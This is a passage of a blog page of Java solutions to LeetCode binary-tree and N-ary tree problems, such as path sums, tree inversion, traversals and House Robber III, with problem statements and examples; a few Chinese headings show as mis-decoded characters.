class="keyword">if</span> (node.left != <span class="literal">null</span>) queue.add(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>) queue.add(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç®€åŒ–ç‰ˆï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        root = queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (root.right != <span class="literal">null</span>) queue.add(root.right);</span><br><span class="line">        <span class="keyword">if</span> (root.left != <span class="literal">null</span>) queue.add(root.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="1302-deepest-leaves-sum">1302. Deepest Leaves Sum âˆš</span></h2><p>Given a binary tree, return the sum of values of its deepest leaves.</p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/07/31/1483_ex1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,2,3,4,5,null,6,7,null,null,null,null,8]</span><br><span class="line">Output: 15</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deepestLeavesSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">         ArrayList&lt;Integer&gt; rec = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> q.size();</span><br><span class="line">            rec.clear();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> q.poll();</span><br><span class="line">                rec.add(tmp.val);</span><br><span class="line">                <span class="keyword">if</span>(tmp.left!=<span class="literal">null</span>) q.offer(tmp.left);</span><br><span class="line">                <span class="keyword">if</span>(tmp.right!=<span class="literal">null</span>) q.offer(tmp.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:rec) sum+=i;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="226-invert-binary-tree">226. Invert Binary Tree âˆš</span></h2><p>Invert a binary tree.</p><p><strong>Example:</strong></p><p>Input:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  2     7</span><br><span class="line"> / \   / \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  7     2</span><br><span class="line"> / \   / \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        invert(root);</span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invert</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left=root.right;</span><br><span class="line">        root.right=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="112-path-sum">112. Path Sum âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> sum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum==root.val&amp;&amp;root.left==root.right) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.right,sum-root.val)|| hasPathSum(root.left,sum-root.val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="111-minimum-depth-of-binary-tree">111. Minimum Depth of Binary Tree âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> find(root,<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(TreeNode root,<span class="type">int</span> depth)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left==root.right) <span class="keyword">return</span> depth;</span><br><span class="line">       <span class="type">int</span> left=find(root.left,depth+<span class="number">1</span>);</span><br><span class="line">       <span class="type">int</span> right=find(root.right,depth+<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">return</span> (left==<span class="number">0</span>||right==<span class="number">0</span>)?left+right:Math.min(left,right);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="437-path-sum-iii-">437. Path Sum III -</span></h2><p>You are given a binary tree in which each node contains an integer value.</p><p>Find the number of paths that sum to a given value.</p><p>The path does not need to start or end at the root or a leaf, but it must go downwards (traveling only from parent nodes to child nodes).</p><p>The tree has no more than 1,000 nodes and the values are in the range -1,000,000 to 1,000,000.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root = [10,5,-3,3,2,null,11,3,-2,null,1], sum = 8</span><br><span class="line"></span><br><span class="line">      10</span><br><span class="line">     /  \</span><br><span class="line">    5   -3</span><br><span class="line">   / \    \</span><br><span class="line">  3   2   11</span><br><span class="line"> / \   \</span><br><span class="line">3  -2   1</span><br><span class="line"></span><br><span class="line">Return 3. The paths that sum to 8 are:</span><br><span class="line"></span><br><span class="line">1.  5 -&gt; 3</span><br><span class="line">2.  5 -&gt; 2 -&gt; 1</span><br><span class="line">3. -3 -&gt; 11</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> sum)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> pathSumFrom(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">pathSumFrom</span><span class="params">(TreeNode node, <span class="type">int</span> sum)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> (node.val == sum ? <span class="number">1</span> : <span class="number">0</span>) </span><br><span class="line">           + pathSumFrom(node.left, sum - node.val) + pathSumFrom(node.right, sum - node.val);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="404-sum-of-left-leaves">404. Sum of Left Leaves Ã—</span></h2><p>Find the sum of all left leaves in a given binary tree.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line"></span><br><span class="line">There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (isLeaf(root.left)) <span class="keyword">return</span> root.left.val + sumOfLeftLeaves(root.right);</span><br><span class="line">    <span class="keyword">return</span> sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isLeaf</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="687-longest-univalue-path">687. Longest Univalue Path Ã—</span></h2><p>Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root.</p><p>The length of path between two nodes is represented by the number of edges between them. </p><p><strong>Example 1:</strong></p><p><strong>Input:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   / \</span><br><span class="line">  4   5</span><br><span class="line"> / \   \</span><br><span class="line">1   1   5</span><br></pre></td></tr></table></figure><p><strong>Output:</strong> 2 </p><p><strong>Example 2:</strong></p><p><strong>Input:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  4   5</span><br><span class="line"> / \   \</span><br><span class="line">4   4   5</span><br></pre></td></tr></table></figure><p><strong>Output:</strong> 2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestUnivaluePath</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> helper(root.left, root.val);</span><br><span class="line">       <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> helper(root.right, root.val);</span><br><span class="line">      <span class="keyword">return</span> Math.max(left + right, Math.max(longestUnivaluePath(root.left), longestUnivaluePath(root.right)));</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">helper</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="literal">null</span> || root.val != val) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span> + Math.max(helper(root.left, val), helper(root.right, val));</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><h2><span id="337-house-robber-iii">337. House Robber III âˆš</span></h2><p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the â€œroot.â€ Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that â€œall houses in this place forms a binary treeâ€. It will automatically contact the police if two directly-linked houses were broken into on the same night.</p><p>Determine the maximum amount of money the thief can rob tonight without alerting the police.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,3,null,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    / \</span><br><span class="line">   2   3</span><br><span class="line">    \   \ </span><br><span class="line">     3   1</span><br><span class="line"></span><br><span class="line">Output: 7 </span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,4,5,1,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    / \</span><br><span class="line">   4   5</span><br><span class="line">  / \   \ </span><br><span class="line"> 1   3   1</span><br><span class="line"></span><br><span class="line">Output: 9</span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 4 + 5 = 9.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root.left != <span class="literal">null</span>) &#123;</span><br><span class="line">        val += rob(root.left.left) + rob(root.left.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">        val += rob(root.right.left) + rob(root.right.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Math.max(val + root.val, rob(root.left) + rob(root.right));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å±‚æ¬¡éå†å°±å¯ä»¥åšã€‚</p><h2><span id="590-n-ary-tree-postorder-traversal">590. N-ary Tree Postorder Traversal âˆš</span></h2><p>Given an n-ary tree, return the <em>postorder</em> traversal of its nodesâ€™ values.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Follow up:</strong></p><p>Recursive solution is trivial, could you do it iteratively? </p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: [5,6,3,2,4,1]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]</span><br><span class="line">Output: [2,6,14,11,7,3,12,8,4,13,9,10,5,1]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;      </span><br><span class="line">       postT(root,res);</span><br><span class="line">       res.add(root.val);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postT</span><span class="params">(Node root, List&lt;Integer&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(Node c: root.children)&#123;</span><br><span class="line">           postT(c,res);</span><br><span class="line">           res.add(c.val);</span><br><span class="line">       &#125;   </span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="589-n-ary-tree-preorder-traversal">589. N-ary Tree Preorder Traversal âˆš</span></h2><p>Given an n-ary tree, return the <em>preorder</em> traversal of its nodesâ€™ values.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Follow up:</strong></p><p>Recursive solution is trivial, could you do it iteratively?</p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: [1,3,5,6,2,4]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res =<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       res.add(root.val);</span><br><span class="line">       find(root,res);           </span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">find</span><span class="params">(Node root,List&lt;Integer&gt; res)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root!=<span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">for</span>(Node n:root.children)&#123;</span><br><span class="line">               res.add(n.val);</span><br><span class="line">               find(n,res);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="559-maximum-depth-of-n-ary-tree">559. Maximum Depth of N-ary Tree âˆš</span></h2><p>Given a n-ary tree, find its maximum depth.</p><p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(Node root)</span> &#123;       </span><br><span class="line">        <span class="keyword">return</span> dfs(root, <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(Node root, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">       <span class="type">int</span> res=depth;</span><br><span class="line">       <span class="keyword">if</span> (root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;         </span><br><span class="line">       <span class="keyword">for</span> (Node child:root.children) &#123;</span><br><span class="line">           res=Math.max(dfs(child, depth+<span class="number">1</span>),res);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="337-house-robber-iii-">337. House Robber III -</span></h2><p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the â€œroot.â€ Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that â€œall houses in this place forms a binary treeâ€. It will automatically contact the police if two directly-linked houses were broken into on the same night.</p><p>Determine the maximum amount of money the thief can rob tonight without alerting the police.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,3,null,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    / \</span><br><span class="line">   2   3</span><br><span class="line">    \   \ </span><br><span class="line">     3   1</span><br><span class="line"></span><br><span class="line">Output: 7 </span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,4,5,1,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    / \</span><br><span class="line">   4   5</span><br><span class="line">  / \   \ </span><br><span class="line"> 1   3   1</span><br><span class="line"></span><br><span class="line">Output: 9</span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 4 + 5 = 9.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> root.val,v2=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">           v2+=rob(root.left);</span><br><span class="line">           v1+=rob(root.left.right)+rob(root.left.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(root.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">           v2+=rob(root.right);</span><br><span class="line">           v1+=rob(root.right.right)+rob(root.right.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Math.max(v1,v2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ ‘çš„æ€§è´¨">æ ‘çš„æ€§è´¨</span></h1><h2><span id="897-increasing-order-search-tree">897. Increasing Order Search Tree Ã—</span></h2><p>Given a binary search tree, rearrange the tree in <strong>in-order</strong> so that the leftmost node in the tree is now the root of the tree, and every node has no left child and only 1 right child.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 